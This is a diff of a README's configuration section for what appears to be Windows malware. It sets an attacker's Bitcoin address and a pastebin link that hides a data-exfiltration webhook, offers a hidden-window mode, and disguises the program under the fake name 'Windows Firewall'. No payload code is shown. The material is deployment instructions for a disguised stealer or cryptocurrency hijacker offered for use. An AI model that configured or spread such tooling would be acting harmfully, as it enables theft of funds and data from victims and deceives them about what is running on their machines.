@@ -20,7 +20,7 @@ Once you have opened the script in your desired text editor, there are 3 lines t
 ```
 # Configuration
 BTC_ADDRESS = '3LsZH7LqxJMZBaVU9YoTLk8HNnUcmzE88v' <--- Change this to your own bitcoin address
-webhookURL = "webhook" <--- Change this to your own webhook
+pastebin = "https://pastebin.com/raw/id" <--- Change this to your own pastebin link that contains your webhook
 hiddenWindow = False <--- Set this to True or False. If you want the window to be hidden on execution then set this to True
 FakeFileName = "Windows Firewall" <--- Change this to the fake desired name.
 ```
